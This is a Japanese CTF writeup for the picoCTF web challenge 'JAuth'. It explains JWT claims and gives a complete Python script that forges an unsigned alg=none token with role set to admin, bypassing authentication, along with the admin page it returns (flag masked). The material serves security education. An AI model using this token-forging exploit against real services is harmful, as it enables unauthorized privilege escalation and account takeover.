---
title: 'JAuth - picoCTF'
description: 'JAuthのWriteupです。'
pubDate: 2025-12-23
category: 'CTF'
tags: ['picoCTF', 'Writeup', 'Web', 'JWT']
---

# JAuth - picoCTF

## 初期調査

ログイン後のtokenをデコード
```
{"typ":"JWT","alg":"HS256"}{"auth":1766470195439,"agent":"python-requests/2.32.5","role":"user","iat":1766470195}
```
JWTを改竄 `alg=none`, `role:admin`\
これを使用して/privateにアクセスしたが変化はなかった。

## JWT Claim

| クレーム名 | 英語名 | 説明 |
| --- | --- | --- |
| iss | issuer | 発行者 |
| sub | subject | 主体（ユーザーIDなど、トークンの対象となるエンティティ）|
| aud | audience | 対象者（このトークンを受け取る想定のサービス）|
| exp | expiration time | 有効期限（UNIXタイムスタンプ）|
| nbf | not before | 有効開始時刻（この時刻より前は無効）|
| iat | issued at | 発行時刻 |
| jti | JWT ID | JWTの一意識別子（リプレイ攻撃対策などに使用）|

### 今回のClaim

デコード結果から`auth`という一般的でないClaimが使用されており、このClaimが検証の肝となっている。\
`auth`の期限が短く、すぐにroleの変更を行わないと設定が反映されない。

## exploit

```python
import requests
from urllib.parse import *
import jwt

URL = "http://challenge-host"

endpoint = "/auth"
data = {
  "username": "test",
  "password": "Test123!"
}

req = requests.post(urljoin(URL, endpoint), data=data, allow_redirects=False)

token = req.cookies.get("token")

decoded = jwt.decode(
  token,
  options={
    "verify_signature": False
  }
)

auth = decoded.get("auth")

payload = {
  "auth": auth,
  "agent": "fox",
  "role": "admin",
  "iat": 1766470195
}

token = jwt.encode(
  payload,
  key=None,
  algorithm="none"
)

endpoint = "/private"
headers = {
  "Cookie": f"token={token}"
}

req = requests.get(urljoin(URL, endpoint), headers=headers)

print(req.text)
```

実行:

```bash
$ python3 exploit.py
<body>
  <div class="text-center">
    <h1>Hello, admin! You have logged in as admin!</h1>
  </div>
  <div class="text-center"><span>picoCTF{***}</span></div>
  <form class="form-signin" action="/logout" method="GET">
    <div class="text-center mb-4">
      <input type="submit" class="btn btn-danger" value="logout" />
    </div>
  </form>
</body>
```